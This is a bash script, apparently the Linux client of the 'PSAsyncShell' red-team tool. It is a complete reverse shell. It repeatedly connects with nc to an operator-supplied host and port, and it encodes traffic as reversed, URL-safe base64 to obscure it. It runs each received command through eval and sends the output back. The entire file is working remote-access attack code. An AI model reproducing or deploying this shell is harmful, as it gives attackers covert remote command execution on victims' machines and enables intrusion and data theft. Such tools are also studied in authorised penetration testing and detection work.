#!/bin/bash
#================================#
#     PSAsyncShell by @JoelGMSec #
#        https://darkbyte.net    #
#================================#

# Variables
host=$2
port=$3
debug=$4

# Functions
debug_log() {
    if [[ ! -z "$debug" ]]; then
        echo "[DEBUG] $1" >&2
    fi
}

encode_data() {
    local data="$1"
    echo -n "$data" | base64 | tr '/+' '_-' | tr -d '=' | tr -d '[:space:]' | rev
}

decode_data() {
    local data="$1"
    local cleaned=$(echo -n "$data" | tr -d '.{}><*$%:;()@~=[]!?^&|#/')
    local reversed=$(echo -n "$cleaned" | rev)
    local base64_data=$(echo -n "$reversed" | tr '_-' '/+')
    local padding=$((4 - (${#base64_data} % 4)))
    if [[ $padding -ne 4 ]]; then
        base64_data="${base64_data}$(printf '=%.0s' $(seq 1 $padding))"
    fi
    echo -n "$base64_data" | base64 -d 2>/dev/null
}

send_data() {
    local data="$1"
    local encoded=$(encode_data "$data")
    echo "$encoded" | nc -w 3 "$host" "$port" 2>/dev/null
}

# Main loop
while true; do
    current_dir=$(pwd)
    encoded_dir=$(encode_data "$current_dir")
    response=$(echo "$encoded_dir" | nc -w 5 "$host" "$port" 2>/dev/null)
    
    if [[ -z "$response" ]]; then
        sleep 1
        continue
    fi
    
    command=$(decode_data "$response")
    debug_log "Received command: '$command'"
    sleep 0.5

    if [[ "$command" == "exit" ]]; then
        debug_log "Exit command detected, terminating..."
        exit 0
    fi

    if [[ "$command" == "[+] PSAsyncShell OK!" ]]; then
        debug_log "Initial connection established"
        send_data "$(pwd)"
        continue
    fi

    if [[ ! "$command" == "[+]"* ]]; then
        if [[ "$command" == "Set-Location"* ]]; then
            command=$(echo "$command" | sed 's/Set-Location/cd/')
        fi
        
        debug_log "Executing command: '$command'"
        if [[ "$command" == "cd"* ]]; then
            if [[ "$command" == "cd" ]]; then
                cd ~
            elif [[ "$command" == "cd .." ]]; then
                cd ..
            elif [[ "$command" =~ ^cd[[:space:]] ]]; then
                path="${command#cd }"
                path=$(echo "$path" | sed "s/^['\"]//; s/['\"]$//")
                if [[ "$path" == "~" ]] || [[ "$path" =~ ^~[/] ]]; then
                    path="${path/#\~/$HOME}"
                fi
                cd "$path" 2>/dev/null || echo "Error: Directory '$path' not found"
            fi
            output=$(pwd)
        else
            output=$(eval "$command" 2>&1)
        fi
        
        exit_code=$?
        debug_log "Command output: '$output'"
        debug_log "Exit code: $exit_code"
        send_data "$output"
    fi
done
